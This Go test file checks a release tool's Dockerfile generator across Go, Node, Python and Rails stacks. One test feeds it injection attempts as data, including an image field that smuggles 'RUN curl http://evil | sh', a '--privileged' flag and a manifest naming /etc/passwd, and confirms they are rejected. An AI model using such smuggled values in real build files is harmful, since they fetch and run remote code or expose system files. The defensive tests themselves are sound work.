package release

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/plytz/caramelo/internal/stack"
)

func dockerfileCases() map[string]Dockerfile {
	base := func() Dockerfile {
		return Dockerfile{App: "shop", Service: "web", Tree: "a1b2c3d4e5f60718", Version: "0.7.0"}
	}
	cases := map[string]Dockerfile{}

	d := base()
	d.Stack, d.Image = stack.Go, "golang:1.23"
	d.Manifests = stack.Manifest{Files: []string{"go.mod", "go.sum"}}
	d.Install, d.Run = "go mod download", "go run ."
	cases["go"] = d

	d = base()
	d.Stack, d.Image = stack.Node, "node:22"
	d.Manifests = stack.Manifest{Files: []string{"package.json", "package-lock.json"}}
	d.Install, d.Run = "npm ci", "npm start"
	cases["node"] = d

	d = base()
	d.Stack, d.Image = stack.Python, "python:3.12"
	d.Manifests = stack.Manifest{Files: []string{"requirements.txt"}}
	d.Install, d.Run = "pip install -r requirements.txt", "python manage.py runserver 0.0.0.0:$PORT"
	cases["python-requirements"] = d

	d = base()
	d.Stack, d.Image = stack.Python, "python:3.12"
	d.Manifests = stack.Manifest{Files: []string{"pyproject.toml"}, NeedsSource: true}
	d.Install, d.Run = "pip install -e .", "gunicorn shop:app"
	cases["python-pyproject"] = d

	d = base()
	d.Stack, d.Image = stack.Rails, "ruby:3.3"
	d.Manifests = stack.Manifest{Files: []string{"Gemfile", "Gemfile.lock", ".ruby-version"}}
	d.Install, d.Run = "bundle install", "bin/rails server -b 0.0.0.0 -p $PORT"
	cases["rails"] = d

	d = base()
	d.Stack, d.Image = stack.Node, "node:22"
	d.Manifests = stack.Manifest{Files: []string{"package.json", "pnpm-lock.yaml"}}
	d.Install, d.Build, d.Run = "pnpm install --frozen-lockfile", "pnpm run build", "node dist/index.js"
	cases["build-step"] = d

	d = base()
	d.Service = "worker"
	d.Stack, d.Image = stack.Node, "node:22"
	d.Manifests = stack.Manifest{Files: []string{"package.json", "package-lock.json"}}
	d.Install = "apt-get update\napt-get install -y --no-install-recommends libpq-dev\nnpm ci"
	d.Run = "npm run worker"
	cases["multiline-install"] = d

	d = base()
	d.Image, d.Run = "alpine:3.20", "./server --port $PORT"
	cases["plain-image"] = d

	return cases
}

func TestGeneratedDockerfiles(t *testing.T) {
	for name, df := range dockerfileCases() {
		t.Run(name, func(t *testing.T) {
			got, err := df.Render()
			if err != nil {
				t.Fatalf("Render: %v", err)
			}
			path := filepath.Join("testdata", "dockerfile", name+".Dockerfile")
			if os.Getenv("CARAMELO_GOLDEN") == "write" {
				if err := os.WriteFile(path, []byte(got), 0o644); err != nil {
					t.Fatalf("write %s: %v", path, err)
				}
			}
			want, err := os.ReadFile(path)
			if err != nil {
				t.Fatalf("read %s: %v (set CARAMELO_GOLDEN=write to create it)", path, err)
			}
			if got != string(want) {
				t.Errorf("%s is not what was generated.\n--- want ---\n%s\n--- got ---\n%s", path, want, got)
			}
		})
	}
}

func TestManifestsAreCopiedBeforeTheInstall(t *testing.T) {
	df := dockerfileCases()["node"]
	out, err := df.Render()
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	copyManifests := strings.Index(out, "COPY package.json package-lock.json ./")
	install := strings.Index(out, "RUN npm ci")
	copyTree := strings.Index(out, "COPY . .")
	switch {
	case copyManifests < 0 || install < 0 || copyTree < 0:
		t.Fatalf("a line is missing:\n%s", out)
	case !(copyManifests < install && install < copyTree):
		t.Errorf("the order is manifests %d, install %d, tree %d:\n%s", copyManifests, install, copyTree, out)
	}
}

func TestSourceFirstWhenTheInstallNeedsIt(t *testing.T) {
	out, err := dockerfileCases()["python-pyproject"].Render()
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	if i, j := strings.Index(out, "COPY . ."), strings.Index(out, "RUN pip install -e ."); i > j {
		t.Errorf("the tree is copied after the install:\n%s", out)
	}
	if !strings.Contains(out, "# The install needs the project itself") {
		t.Errorf("the file does not say why it is not cached:\n%s", out)
	}
}

func TestMultiLineCommandsCannotAddALine(t *testing.T) {
	out, err := dockerfileCases()["multiline-install"].Render()
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	for _, line := range strings.Split(strings.TrimSpace(out), "\n") {
		switch {
		case strings.HasPrefix(line, "#"), strings.HasPrefix(line, "FROM "),
			strings.HasPrefix(line, "WORKDIR "), strings.HasPrefix(line, "COPY "),
			strings.HasPrefix(line, "RUN "), strings.HasPrefix(line, "CMD "):
		default:
			t.Errorf("%q is not a Dockerfile instruction:\n%s", line, out)
		}
	}
	if !strings.Contains(out, `RUN ["sh","-c","apt-get update\napt-get`) {
		t.Errorf("the install is not in exec form:\n%s", out)
	}
}

func TestTrailingBackslashGoesToExecForm(t *testing.T) {
	if got := runLine(`npm ci \`); !strings.HasPrefix(got, `RUN ["sh","-c"`) {
		t.Errorf("runLine = %q", got)
	}
	if got := runLine("  "); got != "" {
		t.Errorf("runLine of nothing = %q", got)
	}
	if got := runLine("npm ci"); got != "RUN npm ci" {
		t.Errorf("runLine = %q", got)
	}
}

func TestRenderRefusesWhatCannotBeWritten(t *testing.T) {
	for _, tc := range []struct {
		name string
		df   Dockerfile
		want string
	}{
		{"an image that is two lines", Dockerfile{Service: "web", Run: "x",
			Image: "node:22\nRUN curl http://evil | sh"}, "not a usable image reference"},
		{"an image with a space", Dockerfile{Service: "web", Run: "x",
			Image: "node:22 --build-arg x=1"}, "not a usable image reference"},
		{"an image that is a flag", Dockerfile{Service: "web", Run: "x",
			Image: "--privileged"}, "not a usable image reference"},
		{"no image at all", Dockerfile{Service: "web", Run: "x"}, "no image"},
		{"no command", Dockerfile{Service: "web", Image: "node:22"}, "no command"},
		{"a manifest that is a flag", Dockerfile{Service: "web", Image: "node:22", Run: "x",
			Manifests: stack.Manifest{Files: []string{"--mount=type=secret"}}}, "cannot be copied"},
		{"a manifest with a space", Dockerfile{Service: "web", Image: "node:22", Run: "x",
			Manifests: stack.Manifest{Files: []string{"package.json /etc/passwd"}}}, "cannot be copied"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out, err := tc.df.Render()
			if err == nil {
				t.Fatalf("Render accepted it:\n%s", out)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("Render = %v, want it to mention %q", err, tc.want)
			}
			if !strings.Contains(err.Error(), `"web"`) {
				t.Errorf("Render = %v, does not name the service", err)
			}
		})
	}
}

func TestRenderAcceptsRealImageReferences(t *testing.T) {
	for _, image := range []string{
		"node:22", "golang:1.23-alpine", "registry.example.com:5000/team/app:v1.2.3",
		"ghcr.io/letsencrypt/pebble@sha256:" + strings.Repeat("a", 64),
	} {
		df := Dockerfile{Service: "web", Image: image, Run: "./x"}
		if _, err := df.Render(); err != nil {
			t.Errorf("Render with image %q: %v", image, err)
		}
	}
}

func TestCommandIsTheImagesCMDThroughAShell(t *testing.T) {
	df := Dockerfile{Service: "web", Image: "node:22", Run: `node -e 'console.log("hi")'`}
	out, err := df.Render()
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	want := `CMD ["sh","-c","node -e 'console.log(\"hi\")'"]`
	if !strings.Contains(out, want) {
		t.Errorf("CMD is not %s:\n%s", want, out)
	}
}

func TestHeaderNamesTheRelease(t *testing.T) {
	out, err := dockerfileCases()["go"].Render()
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	first := strings.SplitN(out, "\n", 2)[0]
	for _, want := range []string{GeneratedBy, "0.7.0", `"web"`, "shop", "go stack", ShortTree("a1b2c3d4e5f60718")} {
		if !strings.Contains(first, want) {
			t.Errorf("the first line %q does not mention %q", first, want)
		}
	}

	bare := Dockerfile{Image: "node:22", Run: "x"}
	out, err = bare.Render()
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	if first := strings.SplitN(out, "\n", 2)[0]; !strings.Contains(first, "unknown version") ||
		!strings.Contains(first, "undetected stack") {
		t.Errorf("the first line of a bare Dockerfile is %q", first)
	}
}
